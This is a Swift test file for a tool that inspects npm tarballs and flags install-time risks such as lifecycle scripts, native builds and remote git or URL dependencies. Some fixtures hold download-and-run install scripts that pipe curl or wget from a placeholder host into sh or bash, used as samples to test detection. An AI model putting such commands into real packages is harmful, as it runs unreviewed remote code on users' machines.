import Foundation
import Testing
import PreviewContracts
@testable import PreviewFormats

@Suite("npm tarball install findings")
struct NPMPackageInspectorTests {
    private typealias Fixtures = InstallFixtures

    private func tarball(_ manifest: String, extra: [Fixtures.Member] = []) throws -> ParsedTextDocument {
        try Fixtures.listing(Fixtures.npmTarball(packageJSON: manifest, extra: extra))
    }

    // MARK: Lifecycle scripts

    @Test func anOrdinaryPostinstallIsCountedAndNothingElse() throws {
        let document = try tarball(Fixtures.manifest(scripts: #""postinstall": "node install.js""#),
                                   extra: [.file("package/install.js", "console.log(1)")])
        #expect(document.findings == [PreviewFinding(kind: .autorunInstallScripts, count: 1)])
    }

    @Test func everyLifecycleScriptCountsOnce() throws {
        let scripts = NPMPackageInspector.lifecycleScripts.map { #""\#($0)": "node x.js""# }.joined(separator: ", ")
        let document = try tarball(Fixtures.manifest(scripts: scripts))
        #expect(Fixtures.finding(.autorunInstallScripts, in: document)?.count == NPMPackageInspector.lifecycleScripts.count)
    }

    @Test func scriptsThatAreNotRunOnInstallAreNotCounted() throws {
        let scripts = #""test": "node test.js", "build": "tsc", "prepublishOnly": "npm test", "install": """#
        let document = try tarball(Fixtures.manifest(scripts: scripts))
        #expect(document.findings.isEmpty)
    }

    @Test func aScriptThatDownloadsAndRunsAlsoReportsWhatItDoesWithoutLines() throws {
        let document = try tarball(Fixtures.manifest(scripts: #""postinstall": "curl -fsSL https://example.invalid/setup.sh | sh""#))
        #expect(Fixtures.kinds(document) == [.autorunInstallScripts, .scriptDownloadAndRun])
        #expect(document.findings.allSatisfy { $0.lines.isEmpty })
        #expect(Fixtures.finding(.scriptDownloadAndRun, in: document)?.severity == .warning)
    }

    @Test func eachScriptIsReadOnItsOwnAndTheirFindingsAreMerged() throws {
        let scripts = #""preinstall": "curl https://example.invalid/a | sh", "postinstall": "wget -qO- https://example.invalid/b | bash""#
        let document = try tarball(Fixtures.manifest(scripts: scripts))
        #expect(Fixtures.finding(.autorunInstallScripts, in: document)?.count == 2)
        #expect(Fixtures.finding(.scriptDownloadAndRun, in: document)?.count == 2)
    }

    @Test func aRepeatedKeyReplacesTheEarlierOneAsJSONParseDoes() throws {
        let manifest = #"{"scripts": {"postinstall": "node a.js"}, "scripts": {"test": "node b.js"}}"#
        #expect(try tarball(manifest).findings.isEmpty)
        let scripts = #"{"scripts": {"postinstall": "node a.js", "postinstall": ""}}"#
        #expect(try tarball(scripts).findings.isEmpty)
    }

    @Test func theLifecycleNamesAreTheOnesTheStandalonePackageJSONLensCounts() throws {
        let lens = AutoRunConfigLens()
        let request = PreviewLensRequest(formatID: .packageJSON, fileName: "package.json")
        let candidates = NPMPackageInspector.lifecycleScripts + [
            "prepublish", "prepublishOnly", "publish", "prepack", "postpack", "test", "pretest", "build", "start",
            "preuninstall", "uninstall", "postuninstall", "version", "dependencies", "shrinkwrap"
        ]
        for name in candidates {
            let counted = try lens.findings(in: #"{"scripts": {"\#(name)": "node x.js"}}"#, request: request,
                                            context: Fixtures.context).first { $0.kind == .autorunInstallScripts }?.count ?? 0
            let ours = try tarball(Fixtures.manifest(scripts: #""\#(name)": "node x.js""#))
                .findings.first { $0.kind == .autorunInstallScripts }?.count ?? 0
            #expect(counted == ours, "\(name)")
            #expect(ours == (NPMPackageInspector.lifecycleScripts.contains(name) ? 1 : 0), "\(name)")
        }
    }

    // MARK: Native build

    @Test func aBindingGypWithoutInstallScriptsMeansAnImplicitNativeBuild() throws {
        let document = try tarball(Fixtures.manifest(), extra: [.file("package/binding.gyp", "{}")])
        #expect(document.findings == [PreviewFinding(kind: .installNativeBuild, count: 1)])
        // Other scripts do not stop npm from building.
        let other = try tarball(Fixtures.manifest(scripts: #""test": "node t.js", "postinstall": "node p.js""#),
                                extra: [.file("package/binding.gyp", "{}")])
        #expect(Fixtures.kinds(other) == [.autorunInstallScripts, .installNativeBuild])
    }

    @Test(arguments: ["install", "preinstall"])
    func anInstallOrPreinstallScriptReplacesTheImplicitBuild(name: String) throws {
        let document = try tarball(Fixtures.manifest(scripts: #""\#(name)": "node-gyp rebuild""#),
                                   extra: [.file("package/binding.gyp", "{}")])
        #expect(Fixtures.kinds(document) == [.autorunInstallScripts])
    }

    @Test func gypfileFalseAndNestedBindingFilesAreNotAnImplicitBuild() throws {
        let off = try tarball(Fixtures.manifest(extra: #""gypfile": false"#), extra: [.file("package/binding.gyp", "{}")])
        #expect(off.findings.isEmpty)
        let on = try tarball(Fixtures.manifest(extra: #""gypfile": true"#), extra: [.file("package/binding.gyp", "{}")])
        #expect(Fixtures.kinds(on) == [.installNativeBuild])
        let nested = try tarball(Fixtures.manifest(), extra: [.file("package/src/binding.gyp", "{}")])
        #expect(nested.findings.isEmpty)
        let empty = try tarball(Fixtures.manifest(scripts: #""install": """#), extra: [.file("package/binding.gyp", "{}")])
        #expect(Fixtures.kinds(empty) == [.installNativeBuild])
    }

    // MARK: Remote dependencies

    @Test func gitAndURLDependenciesAreCountedInBothTables() throws {
        let dependencies = [
            #""a": "git+https://example.invalid/a.git""#, #""b": "git://example.invalid/b.git""#,
            #""c": "github:owner/c""#, #""d": "gitlab:owner/d""#, #""e": "bitbucket:owner/e""#, #""f": "gist:0123abcd""#,
            #""g": "http://example.invalid/g.tgz""#, #""h": "https://example.invalid/h.tgz""#,
            #""i": "owner/i""#, #""j": "owner/j#v1.2.0""#, #""k": "Owner/k#semver:^1.0.0""#,
        ].joined(separator: ", ")
        let document = try tarball(Fixtures.manifest(dependencies: dependencies,
                                                     optionalDependencies: #""l": "git+ssh://git@example.invalid/l.git""#))
        #expect(document.findings == [PreviewFinding(kind: .installRemoteDependencies, count: 12)])
    }

    @Test func rangesAliasesAndLocalSourcesAreNotRemote() throws {
        let dependencies = [
            #""a": "^1.2.3""#, #""b": "~1.2.3""#, #""c": ">=1.0.0 <2.0.0""#, #""d": "1.2.3""#, #""e": "latest""#,
            #""f": "*""#, #""g": "1.x || 2.x""#, #""h": "file:../h""#, #""i": "link:../i""#, #""j": "workspace:*""#,
            #""k": "npm:other@^1.0.0""#, #""l": "npm:@scope/other@1.0.0""#, #""m": "./local/m""#, #""n": "../n""#,
            #""o": "/abs/o""#, #""p": "~/home/p""#, #""q": "@scope/q""#, #""r": "a/b/c""#, #""s": "1""#, #""t": 5"#,
            #""u": null"#, #""v": {"x": "git+https://example.invalid/v.git"}"#, #""w": """#,
        ].joined(separator: ", ")
        let document = try tarball(Fixtures.manifest(dependencies: dependencies))
        #expect(document.findings.isEmpty)
    }

    @Test func developmentAndPeerDependenciesAreNotInstalledWithThePackage() throws {
        let manifest = #"{"devDependencies": {"a": "github:owner/a"}, "peerDependencies": {"b": "github:owner/b"}}"#
        #expect(try tarball(manifest).findings.isEmpty)
    }

    @Test(arguments: [
        ("git+https://example.invalid/a.git", true), ("GIT+SSH://example.invalid/a.git", true), ("  github:owner/a ", true),
        ("owner/a", true), ("owner/a#main", true), ("my-org/my.repo_1", true), ("1abc/repo", true),
        ("^1.0.0", false), ("1.0.0 - 2.0.0", false), ("a/b/c", false), ("a/", false), ("/b", false), ("@s/p", false),
        (".a/b", false), ("-a/b", false), ("~a/b", false), ("a b/c", false), ("a/b c", false), ("file:a/b", false),
        ("link:a/b", false), ("workspace:a/b", false), ("npm:a/b", false), ("", false)
    ])
    func dependencySourceRules(specification: String, expected: Bool) {
        #expect(NPMPackageInspector.isRemoteSource(specification) == expected, "\(specification)")
    }
}
